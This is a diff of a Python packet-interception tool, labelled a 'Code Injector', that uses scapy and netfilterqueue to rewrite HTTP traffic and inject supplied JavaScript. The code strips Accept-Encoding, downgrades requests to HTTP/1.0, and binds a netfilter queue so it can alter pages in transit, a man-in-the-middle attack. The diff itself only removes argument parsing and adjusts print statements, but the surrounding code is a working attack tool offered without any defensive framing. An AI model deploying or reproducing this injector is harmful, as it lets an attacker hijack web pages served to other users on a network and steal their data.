@@ -3,22 +3,8 @@
 import scapy.all as scapy
 import netfilterqueue
 import re
-import optparse
 import queue
 queue = queue.Queue()
-
-
-# def get_arguments():
-#     parser = optparse.OptionParser()
-#     parser.add_option("-j", "--js-code", dest="code", help="Javascript Code")
-#     parser.add_option("-i", "--interface", dest="interface", help="Arp Interface")
-#     (options, arguments) = parser.parse_args()
-
-#     if not options.code:
-#         parser.error("[-] Please specify Javascript Code , use --help for more.")
-#     if not options.interface:
-#         parser.error("[-] Please specify interface , use --help for more.")
-#     return options
 
 
 def set_load(packet, load):
@@ -35,7 +21,7 @@ def inject(injection_code):
         if scapy_packet.haslayer(scapy.Raw):
             load = scapy_packet[scapy.Raw].load
             if scapy_packet[scapy.TCP].dport == 80:
-                print("[+] Request")
+                # print("[+] Request")
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                 load = load.replace("HTTP/1.1" , "HTTP/1.0")
 
@@ -57,11 +43,9 @@ def inject(injection_code):
 
         packet.accept()
 
-
-# options = get_arguments()
-# print("Code Injector\n\t-Alrocks29")
 def run_injectjs(injection_code):
     try:
+        print(injection_code)
         queue = netfilterqueue.NetfilterQueue()
         queue.bind(0, inject(injection_code))
         queue.run()
